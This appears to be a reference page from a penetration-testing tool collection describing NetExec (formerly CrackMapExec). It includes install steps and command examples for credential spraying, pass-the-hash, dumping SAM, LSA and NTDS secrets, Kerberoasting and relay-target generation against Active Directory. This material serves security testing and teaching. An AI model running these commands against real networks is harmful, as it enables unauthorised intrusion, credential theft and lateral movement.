# NetExec (nxc)

> The Swiss-army knife of AD enumeration and lateral movement — sweep whole
> subnets over SMB/LDAP/WinRM/MSSQL/etc., validate credentials, spray hashes,
> dump secrets and enumerate shares from a single command line.

- **Link:** https://github.com/Pennyw0rth/NetExec
- **Type:** open source
- **Platform:** Linux (cross-platform via pipx/Docker)

## Description

NetExec (`nxc`) is the actively maintained successor to **CrackMapExec**.
CrackMapExec (`crackmapexec` / `cme`) is now deprecated and unmaintained — the
community forked it into NetExec, which keeps the same workflow but adds
protocols, modules and bug fixes. It lets you take a set of credentials (a
password, an NTLM hash, or a Kerberos ticket) and test them across many hosts
and protocols at once: check who can authenticate where, enumerate SMB shares,
query LDAP, list users, dump the SAM/LSA, and run modules. It's the tool you
reach for right after you obtain any valid domain credential.

## Installation

```bash
# Recommended: isolated install via pipx
pipx install git+https://github.com/Pennyw0rth/NetExec.git

# Or on recent Kali
sudo apt install netexec
```

## Usage examples

```bash
# Validate a credential across a subnet over SMB (look for Pwn3d! = local admin)
nxc smb 10.0.0.0/24 -u jsmith -p 'Passw0rd!'

# Same but with an NTLM hash instead of a password (pass-the-hash)
nxc smb 10.0.0.0/24 -u administrator -H aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Enumerate readable SMB shares
nxc smb 10.0.0.5 -u jsmith -p 'Passw0rd!' --shares

# Null-session / anonymous enumeration of users and password policy
nxc smb 10.0.0.5 -u '' -p '' --users --pass-pol

# Dump local SAM hashes / LSA secrets (needs local admin)
nxc smb 10.0.0.5 -u administrator -p 'Passw0rd!' --sam --lsa

# Dump domain hashes from the DC (needs DA / DCSync rights)
nxc smb dc01.corp.local -u administrator -p 'Passw0rd!' --ntds
```

### LDAP and WinRM

```bash
# LDAP: enumerate the domain and pull user descriptions
nxc ldap dc01.corp.local -u jsmith -p 'Passw0rd!' --users

# LDAP: find Kerberoastable / AS-REP-roastable accounts
nxc ldap dc01.corp.local -u jsmith -p 'Passw0rd!' --kerberoasting kerb.txt
nxc ldap dc01.corp.local -u jsmith -p 'Passw0rd!' --asreproast asrep.txt

# LDAP: BloodHound collection straight from nxc
nxc ldap dc01.corp.local -u jsmith -p 'Passw0rd!' --bloodhound --collection All --dns-server 10.0.0.1

# WinRM: check remote-management access (5985/5986)
nxc winrm 10.0.0.0/24 -u jsmith -p 'Passw0rd!'

# Generate an SMB-signing-disabled relay target list (for ntlmrelayx)
nxc smb 10.0.0.0/24 --gen-relay-list relay_targets.txt
```

## Notes & references

- `Pwn3d!` in the output means the credential has **local admin** on that host.
- Add `--continue-on-success` when password-spraying so it doesn't stop at the
  first hit; use `-k`/`--use-kcache` for Kerberos auth.
- Feeds directly into [BloodHound](bloodhound.md), [Evil-WinRM](evil-winrm.md),
  [Impacket](impacket.md) and offline cracking in
  [Password Cracking & Hashing](../password-cracking/).
- Migration note from CrackMapExec: https://github.com/Pennyw0rth/NetExec/wiki
- Legacy CME docs (concepts still apply):
  https://ptestmethod.readthedocs.io/en/latest/cme.html
